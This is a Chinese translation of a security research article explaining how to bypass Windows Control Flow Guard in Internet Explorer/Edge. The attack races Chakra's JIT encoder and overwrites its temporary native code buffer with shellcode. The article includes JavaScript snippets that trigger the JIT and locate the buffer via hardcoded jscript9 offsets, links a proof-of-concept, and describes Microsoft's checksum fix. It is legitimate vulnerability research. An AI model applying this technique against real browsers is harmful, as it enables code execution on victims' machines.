# 【技术分享】基于Chakra JIT的CFG绕过技术

阅读量 **138551**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-12-26 09:35:47

 **x**

##### 译文声明

本文是翻译文章，文章来源：theori.io

原文地址：<http://theori.io/research/chakra-jit-cfg-bypass>

译文仅供参考，具体内容表达以及含义原文为准。

****

****

**翻译：**[ **shan66**
****](http://bobao.360.cn/member/contribute?uid=2522399780)

**预估稿费：200RMB（不服你也来投稿啊！）**

******投稿方式：发送邮件至**[ **linwei#360.cn**](mailto:linwei@360.cn) **，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿******

**引言**

在本文中，我们将向读者介绍在攻击Internet
Explorer和Edge浏览器时可用于绕过Microsoft的控制流防护（CFG）的方法。我们以前的概念验证性质的漏洞利用代码是通过覆盖对象的函数指针来实现的。但是，当遇到CFG时，这种方法就不太好使了。我们假设攻击者已经获得了读写内存权限。

  

**背景知识**

CFG是微软近来为Windows系统添加一种安全防护机制。该机制通过间接调用/跳转指令的目标地址的高效检查来提供保护。如果您希望进一步了解CFG的更多详情，可以参阅参考文献[[1]](http://blog.trendmicro.com/trendlabs-security-intelligence/exploring-control-flow-guard-in-windows-10/)[[2]](https://blog.coresecurity.com/2015/03/25/exploiting-cve-2015-0311-part-ii-bypassing-control-flow-guard-on-windows-8-1-update-3/)[[3]](http://www.powerofcommunity.net/poc2014/mj0011.pdf)，所以我们不做深入细致的讲解。

虽然该缓解机制增加了控制流劫持型攻击的难度，但是CFG本身并不完美。该技术的设计目标是保护间接调用和跳转，所以，没有为堆栈（即ROP仍是可能的）提供保护。此外，值得注意的是，这是一个编译时插桩技术，需要重新编译源代码。尽管微软现在的许多二进制文件可以受益于CFG，但还有很多其他程序不是利用CFG保护机制编译的。

  

**Chakra JIT**

Chakra JIT负责为多次调用的函数和循环生成优化的JIT代码。这个过程分为多个阶段完成，其中Full JIT Compiler和Garbage
Collection阶段是在后台线程中进行的。如果您有兴趣的话，可以从MSDN上找到相关的工作流程和各种图释。

  

**JIT工作流程（摘自MSDN）**

我们关注的重点是Full JIT
Compiler阶段，它负责获取字节码和输出本地代码。针对单个函数或循环的高级处理是在Func::Codegen()中进行的。首先，它会生成字节码的中间表示（IR）。然后，这些IR将被转换若干次：优化、寄存器分配、prolog和epilog等。一旦IR准备就绪，就会被Encoder::Encode()编码为本地代码。

    
    
    // https://github.com/Microsoft/ChakraCore/blob/master/lib/Backend/Encoder.cpp#L15
    void
    Encoder::Encode()
    {
        NoRecoverMemoryArenaAllocator localAlloc(_u("BE-Encoder"), m_func->m_alloc->GetPageAllocator(), Js::Throw::OutOfMemory);
        m_tempAlloc = &localAlloc;
    ...
        m_encodeBuffer = AnewArray(m_tempAlloc, BYTE, m_encodeBufferSize);
    ...
    }

实际上，真正生成实际本地代码的任务是由Encoder完成的。首先，它会分配m_encodeBuffer来临时存放本地代码。当所有本地指令被发送到m_encodeBuffer之后，Encoder将对该缓冲区进行重新定位，将其复制到read-only-execute内存，并按照CFG的要求处理调用目标。此时，该临时缓冲区就不再使用，所以可以释放了。

    
    
    // https://github.com/Microsoft/ChakraCore/blob/master/lib/Backend/Encoder.cpp#L294
    ...
        m_encoderMD.ApplyRelocs((size_t) workItem->GetCodeAddress());
        workItem->RecordNativeCode(m_func, m_encodeBuffer);
        m_func->GetScriptContext()->GetThreadContext()->SetValidCallTargetForCFG((PVOID) workItem->GetCodeAddress());
    ...

注意，一旦代码被复制到可执行内存后，就很难修改了。但是，当Encoder在这个临时缓冲器中生成本地代码时，是无法防止攻击者利用写入内存权限来更改临时缓冲器中的代码的。由于JIT进程位于后台线程中，所以JavaScript线程仍然可以正常运行。攻击者的难点是找到该临时缓冲区，并在Encoder运行的极短时间内完成相应的修改任务。

  

**绕过CFG防护**

既然已经知道了修改JIT代码的基本方法，下面就让我们付诸行动，以便设法绕过CFG。

我们的过程分为三步：

触发JIT。

查找临时的本地代码缓冲区。

修改缓冲区的内容。

当然，这里隐含的最后一步是执行JIT处理过的代码。

  

**触发JIT**

第一步，也是最简单的一步，就是触发JIT，让它开始对一个函数进行编码。为了使第二步变得更容易一些，我们希望函数的代码多一些，以便我们有足够的时间在内存中寻找该临时缓冲区。当然，函数中的具体指令是无关紧要的。

    
    
    var code = "var i = 10; var j = 1; ";
    for (var i = 0; i < 6000; i++)
    {
        code += "i *= i + j.toString();";
    }
    code += "return i.toString();"
    f = Function(code);
    for (var i = 0; i < 1000; i++)
    {
        // trigger jit
        f.call();
    }

**查找本机代码缓冲区**

一旦后台线程进入Encoder::Encode()，我们需要快速找到临时本地代码缓冲区。发现缓冲区的一种方法是，找到给该缓冲区分配内存的页分配器，然后逐个查看它分配的内存段。我们注意到，可以先找到ThreadContext，然后找到该后台线程的BackgroundJobProcessor，这样就可以找到该页面分配器的引用了。

    
    
    // find the ThreadContext using ThreadContext::globalListLast
    var tctx = readN(jscript9Base + 0x00349034, 4);
    // BackgroundJobProcessor
    var bgjob = readN(tctx + 0x3b0, 4);
    // PageAllocator
    var pgalloc = bgjob + 0x1c;

PageAllocator具有若干已分配段的列表。由于经JIT处理过的函数会变大，所以该临时本地代码缓冲器也将很大。所以，通过检查largeSegments列表，我们就可以轻松找到该内存段了。我们可以使用一个while循环，这样一直等到这个largeSegments列表变为非空，然后进入最后一步。

    
    
    while (true) {
        // read largeSegments list
        var largeseg = readN(pgalloc + 0x24, 4);
        // check if the list was empty
        if (largeseg == pgalloc + 0x24) continue;
        // get the address of the actual data
        var page = readN(largeseg + 8 + 8, 4);
        if (page == 0) continue;
        break;
    }

**修改并运行**

现在，既然已经知道了临时本地代码缓冲区的位置，那么接下来就可以修改其内容来注入shellcode了。当然，按理说只要使用我们的shellcode覆盖缓冲区的内容就行了，但是实际上要比这个过程要复杂的多，因为我们必须避免覆盖未来在重定位步骤中将要修改的任何内容。因为用于触发JIT的函数需要多次调用toString()，同时还要避免重定位的影响，所以，实际上可用于shellcode的空间并不充裕。

虽然最佳之选是修改要进行JIT处理的函数，但这里选择使用first-stage
shellcode，它只是简单调用VirtualProtect，然后跳转到我们的second-stage shellcode。这个first-stage
shellcode通常是非常小（只有20个字节）的。所以 ，我们可以把first-stage
shellcode放到距这个缓冲区比较近的地方，然后在这个缓冲区的起始位置放上一个近转移指令，从而跳转至该代码。

这样的话，我们的second-stage
shellcode可以是任何长度，所以在我们的漏洞利用代码中，使用了一个metasploit生成shellcode来执行notepad.exe。实际上，这个second-stage shellcode还可以绕过保护模式（沙箱）。

在修改好临时缓冲区之后，我们将进入最后一步，就是进行等待，直到JIT处理完成并执行修改后的JIT代码。为此，你可以不断调用目标函数，直到你的shellcode得到执行为止。

    
    
    for (var i = 0; i < 1000; i++)
    {
        // call overwritten jit block
        f.call();
    }

**漏洞利用**

为了演示这种绕过技术，我们借鉴了此前用于Windows 10上的Internet Explorer
11的利用代码，并进行了相应的修改。其中，获取读写内存权限的代码没有改变，但是在执行我们的shellcode的时候，使用的是JIT代码覆盖技术，而不是去覆盖触发CFG的函数指针。

你可以在<https://github.com/theori-io/jscript9-typedarray-cfg>页面中找到最终的概念验证漏洞利用代码。

  

**安全影响**

由于该CFG绕过漏洞的影响仅限于攻击者已经获得了读写内存权限的情况，因此其实用性在现实中可能会受到一些限制。需要引起警觉的是，这个绕过方法具有内置到Chakra
JIT架构内部的优势，这意味着它可能很难修补，并且不会受到像英特尔的CET这样的未来缓解措施的影响。

  

**补救措施**

微软已经承诺对ChakraCore进行相应的修改，以缓解我们发现的CFG绕过（以及其他CVE补丁）漏洞所造成的威胁。他们的基本思想是，在编码器编码指令时计算校验和，然后在将整个缓冲区复制到最终的RX（read/execute-only）缓冲区之后对校验和进行验证。并且，只有通过验证后，JIT处理后的代码的入口点才能作为有效的CFG目标。这里的选择的校验和算法是CRC32。

我们希望这篇文章将激励他人继续研究绕过目前的缓解措施新的方法，并发展新的缓解措施。

本文翻译自theori.io [原文链接](http://theori.io/research/chakra-jit-cfg-bypass)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **shan66** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/85200](/post/id/85200)

安全客 - 有思想的安全新媒体

本文转载自: [theori.io](http://theori.io/research/chakra-jit-cfg-bypass)

如若转载,请注明出处： <http://theori.io/research/chakra-jit-cfg-bypass>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhmsg.com/dm/200_200_100/t0137bdcb0fbd458b88.jpg) shan66

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

